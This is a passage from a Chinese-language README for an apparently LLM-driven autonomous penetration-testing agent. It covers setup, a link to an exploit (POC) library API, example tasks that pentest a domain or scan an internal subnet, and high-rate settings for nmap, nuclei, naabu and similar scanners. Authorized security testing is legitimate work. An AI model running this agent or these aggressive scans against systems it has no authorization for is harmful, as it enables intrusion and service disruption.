export WEAPON_RADAR_URL=http://127.0.0.1:8765  # WeaponRadar API 地址

# 交互式 REPL
node dist/bin/ovogogogo.js

# 单次任务
node dist/bin/ovogogogo.js "对 example.com 进行全面渗透测试"

# 自定义参数
node dist/bin/ovogogogo.js \
  --model gpt-4o \
  --max-iter 200 \
  --cwd /project/ovogogogo \
  "扫描 192.168.1.0/24 内网段"
```

### REPL 内置命令

| 命令 | 说明 |
|------|------|
| `/plan <任务>` | 计划模式：先分析不执行，确认后再运行 |
| `/skills` | 列出所有可用技能 |
| `/<skill> [args]` | 运行指定技能（如 `/nmap 192.168.1.1`） |
| `/clear` | 清空对话历史 |
| `/history` | 显示当前历史消息数 |
| `/model` | 显示当前模型 |
| `/cwd` | 显示工作目录 |
| `/help` | 显示帮助 |
| `/exit` | 退出 |

### 64 核服务器工具并发推荐参数

| 工具 | 推荐参数 | 说明 |
|------|---------|------|
| nuclei | `-c 100 -bs 50 -rl 500` | 并发100模板/50目标/500RPS |
| ffuf | `-t 200` | 200线程 |
| httpx | `-t 300 -timeout 10` | 300线程，每请求10s超时 |
| subfinder | `-t 100` | 100线程 |
| dnsx | `-t 200` | 200线程 |
| naabu | `-rate 10000` | 万包/秒 |
| nmap | `-T4 --min-rate 5000` | 高速扫描（全端口必须后台运行） |
| katana | `-d 2 -timeout 30` | 深度2层，30s请求超时 |

---
### 使用说明
 export WEAPON_RADAR_URL=http://POC库接口:8765
# 1. 注入 API 密钥
export OPENAI_API_KEY=APIKEY

# 2. 设置端点（将 OpenAI 的请求流量重定向到阿里云）
export OPENAI_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1（默认）

# 3. 指定默认大脑（ovogogogo 启动时会优先读取这个变量）
export OVOGO_MODEL=qwen3-max
export OVOGO_MAX_ITER=1000

# 1. 进入项目根目录
cd /project/ovogogogo

# 2. 安装运行环境所需的库（pnpm 效率最高）
pnpm install

# 3. 将 TypeScript 编译为可执行的 JavaScript

npm run build
#启动
node dist/bin/ovogogogo.js

> 本项目仅用于授权范围内的安全测试。使用者须确保已获得目标系统的书面授权，并遵守当地法律法规。
